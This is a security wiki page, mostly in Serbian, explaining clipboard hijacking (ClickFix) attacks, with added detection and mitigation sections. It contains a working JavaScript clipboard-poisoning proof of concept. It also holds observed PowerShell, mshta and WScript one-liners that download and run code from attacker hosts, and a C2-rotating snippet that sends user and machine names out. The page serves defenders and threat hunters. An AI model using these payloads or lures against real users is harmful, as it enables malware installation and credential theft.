# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nikada ne lepite ništa što niste sami kopirali." – staro, ali i dalje važeći savet

## Pregled

Clipboard hijacking – takođe poznat kao *pastejacking* – iskorišćava činjenicu da korisnici rutinski kopiraju i lepe komande bez da ih pregledaju. Zlonamerni veb-sajt (ili bilo koji JavaScript-sposoban kontekst kao što su Electron ili Desktop aplikacija) programski postavlja tekst pod kontrolom napadača u sistemski clipboard. Žrtve se podstiču, obično pažljivo osmišljenim social-engineering uputstvima, da pritisnu **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ili otvore terminal i *paste* sadržaj clipboard-a, čime se odmah izvršavaju proizvoljne komande.

Pošto se **nijedan fajl ne preuzima i nijedan attachment se ne otvara**, tehnika zaobilazi većinu bezbednosnih kontrola za e-mail i web-sadržaj koje nadgledaju attachments, macros ili direktno izvršavanje komandi. Zbog toga je napad popularan u phishing kampanjama koje isporučuju uobičajene familije malware-a kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje su koristile `document.execCommand('copy')`, novije se oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).

## Tok ClickFix / ClearFake

1. Korisnik posećuje typosquatted ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Injected **ClearFake** JavaScript poziva pomoćnu funkciju `unsecuredCopyToClipboard()` koja tiho skladišti Base64-encoded PowerShell one-liner u clipboard.
3. HTML uputstva kažu žrtvi: *“Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da rešite problem.”*
4. `powershell.exe` se izvršava, preuzima arhivu koja sadrži legitimni izvršni fajl plus maliciozni DLL (klasični DLL sideloading).
5. Loader dekriptuje dodatne faze, ubacuje shellcode i instalira persistence (npr. scheduled task) – na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.

### Primer lanca NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitiman Java WebStart) traži u svom direktorijumu `msvcp140.dll`.
* Zlonamerni DLL dinamički rešava API-je pomoću **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) preko **curl.exe**, dekriptuje ih koristeći rolling XOR key `"https://google.com/"`, injektuje finalni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` pomoću **curl.exe**
2. Izvršava JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → postavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer putem MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Poziv **mshta** pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, izvlači `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` pomoću `extrac32` i konkatenacije fajlova i na kraju izvršava `.a3x` skript koji eksfiltruje kredencijale pretraživača na `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Neke ClickFix kampanje potpuno preskaču preuzimanje fajlova i naređuju žrtvama da nalepte one‑liner koji preuzima i izvršava JavaScript preko WSH, trajno ga postavlja i rotira C2 dnevno. Primer uočenog lanca:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne karakteristike
- Obfuskirani URL je obrnut pri izvođenju kako bi se izbegla površna inspekcija.
- JavaScript se održava putem Startup LNK (WScript/CScript) i bira C2 prema trenutnom datumu — omogućavajući brzu rotaciju domena.

Minimalni JS fragment koji se koristi za rotaciju C2 po datumu:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Next stage commonly deploys a loader that establishes persistence and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
